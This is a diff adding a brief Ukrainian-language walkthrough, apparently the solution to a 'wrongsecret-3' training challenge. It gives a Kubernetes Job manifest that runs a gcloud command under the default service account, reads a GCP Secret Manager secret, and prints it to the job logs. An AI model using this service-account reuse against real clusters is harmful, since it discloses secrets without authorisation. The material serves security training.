@@ -1,0 +1,32 @@
+Ви можете вирішити цю проблему, виконавши такі кроки:
+
+- Створіть новий файл завдання `job.yaml` з таким вмістом:
+
+```yaml
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: wrongsecret-3
+spec:
+  template:
+    spec:
+      serviceAccountName: default
+      containers:
+        - name: gcloud
+          image: gcr.io/google.com/cloudsdktool/cloud-sdk:latest
+          command:
+            [
+              "gcloud",
+              "secrets",
+              "versions",
+              "access",
+              "latest",
+              "--secret=wrongsecret-3",
+            ]
+      restartPolicy: Never
+```
+
+Це завдання виконує команду `gcloud secrets versions access latest --secret=wrongsecret-3`. Оскільки завдання може отримати доступ до того ж облікового запису служби, що й під секретних завдань, воно може отримати доступ до GCP з тими ж привілеями.
+
+- Застосуйте завдання за допомогою `kubectl apply -f job.yaml`
+- Перевірте журнали завдання за допомогою `kubectl logs job/wrongsecret-3`. Це має показати вам рішення :)
